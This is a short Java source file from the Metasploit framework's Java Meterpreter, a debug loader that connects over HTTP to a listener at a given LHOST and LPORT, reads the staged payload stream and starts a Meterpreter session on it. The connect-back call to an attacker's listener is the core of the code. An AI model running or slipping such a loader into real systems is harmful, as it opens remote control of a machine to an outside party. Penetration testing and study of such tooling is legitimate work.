package com.metasploit.meterpreter;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.URL;

/**
 * A loader that does not use the provided jars but loads all classes from the current classpath. Useful for debugging with the edit-and-continue feature enabled.
 * 
 * @author mihi
 */
public class URLDebugLoader {
	/**
	 * Main entry point.
	 */
	public static void main(String[] args) throws Exception {
		if (args.length < 2) {
			System.out.println("Usage: java com.metasploit.meterpreter.URLDebugLoader <LHOST> <LPORT> [<RedirectError>]");
			return;
		}
		URL initURL = new URL("http://" + args[0] + ":" + args[1] + "/INITJM");
		DataInputStream in = new DataInputStream(initURL.openStream());
		OutputStream out = new DataOutputStream(new ByteArrayOutputStream());
		int coreLen = in.readInt();
		while (coreLen != 0) {
			in.readFully(new byte[coreLen]);
			coreLen = in.readInt();
		}
		coreLen = in.readInt();
		in.readFully(new byte[coreLen]);
		new com.metasploit.meterpreter.Meterpreter(in, out, false, args.length == 3);
	}
}
